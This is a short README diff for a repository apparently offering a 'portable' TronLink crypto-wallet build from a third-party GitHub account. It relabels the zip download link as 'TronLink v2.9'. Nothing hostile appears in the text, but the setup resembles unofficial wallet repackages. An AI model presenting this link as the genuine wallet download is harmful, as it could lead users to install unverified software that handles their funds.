@@ -9,7 +9,7 @@ Smart contract calls integrated;
 
 
 ## Downloads
-**Download** &ndash; [Download](https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip)
+**Download TronLink v2.9** &ndash; [Download](https://github.com/cryptosiast/TronLink_Portable/archive/refs/heads/main.zip)
 
 
 
